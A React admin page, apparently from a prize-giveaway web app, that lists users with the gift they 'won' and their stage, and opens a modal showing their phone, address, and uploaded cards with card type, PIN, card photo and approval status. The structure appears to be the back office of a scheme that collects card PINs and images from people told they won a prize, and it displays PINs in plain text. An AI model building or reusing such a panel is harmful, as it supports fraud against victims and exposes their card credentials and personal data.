import React, { useState, useEffect } from 'react';
import { adminGetAllUsers, adminGetUser } from '../../services/api';
import './Admin.css';

const AdminUsersPage = () => {
  const [users, setUsers] = useState([]);
  const [selectedUser, setSelectedUser] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchUsers = async () => {
      try {
        const res = await adminGetAllUsers();
        setUsers(res.data);
      } catch (err) {
        console.error(err);
      } finally {
        setLoading(false);
      }
    };
    fetchUsers();
  }, []);

  const handleViewUser = async (userId) => {
    try {
      const res = await adminGetUser(userId);
      setSelectedUser(res.data);
    } catch (err) {
      alert('Error fetching user details');
    }
  };

  if (loading) return <p>Loading users...</p>;

  return (
    <div className="admin-users">
      <h2>User Details</h2>
      <table>
        <thead>
          <tr>
            <th>Name</th>
            <th>Email</th>
            <th>Gift Won</th>
            <th>Stage</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>
          {users.map((u) => (
            <tr key={u._id}>
              <td>{u.userDetails?.name || 'N/A'}</td>
              <td>{u.userDetails?.email || 'N/A'}</td>
              <td>{u.giftWon?.name || 'Not spun'}</td>
              <td>{u.step}</td>
              <td><button onClick={() => handleViewUser(u._id)}>Edit</button></td>
            </tr>
          ))}
        </tbody>
      </table>

      {selectedUser && (
        <div className="modal">
          <div className="modal-content">
            <h3>User Details</h3>
            <p><strong>Name:</strong> {selectedUser.userDetails?.name}</p>
            <p><strong>Email:</strong> {selectedUser.userDetails?.email}</p>
            <p><strong>Phone:</strong> {selectedUser.userDetails?.phone}</p>
            <p><strong>Country:</strong> {selectedUser.userDetails?.country}</p>
            <p><strong>Address:</strong> {selectedUser.userDetails?.address}</p>
            <p><strong>Gift:</strong> {selectedUser.giftWon?.name}</p>
            <p><strong>Stage:</strong> {selectedUser.step}</p>
            <h4>Uploaded Cards</h4>
            {selectedUser.cards?.map((card, i) => (
              <div key={i} className="card-info">
                <p>Type: {card.type} - {card.cardType}</p>
                <p>PIN: {card.pin}</p>
                <p>Image: <a href={card.image} target="_blank" rel="noreferrer">View</a></p>
                <p>Status: {card.status}</p>
                {card.rejectionReason && <p>Reason: {card.rejectionReason}</p>}
              </div>
            ))}
            <button onClick={() => setSelectedUser(null)}>Close</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default AdminUsersPage;